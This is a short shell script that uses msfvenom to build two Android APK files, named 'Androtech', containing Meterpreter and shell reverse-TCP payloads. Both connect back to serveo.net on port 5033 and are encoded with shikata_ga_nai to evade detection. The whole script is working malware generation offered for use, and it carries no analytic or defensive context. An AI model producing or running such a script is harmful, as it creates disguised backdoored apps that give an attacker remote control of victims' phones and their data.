#!/usr/bin/sh
msfvenom --platform android -e x86/shikata_ga_nai -i 10 -b "\0x00" -p android/meterpreter/reverse_tcp AndroidWakeLock=true AndroidMeterpreterDebbug=true LHOST=serveo.net LPORT=5033 -f raw -o /root/Bot/app/Androtech.apk
sleep 4
clear
msfvenom --platform android -e x86/shikata_ga_nai -i 10 -b "\0x00" -p android/shell/reverse_tcp AndroidWakeLock=true AndroidMeterpreterDebbug=true LHOST=serveo.net LPORT=5033 -f raw -o /root/Bot/app/Androtech_v1.apk
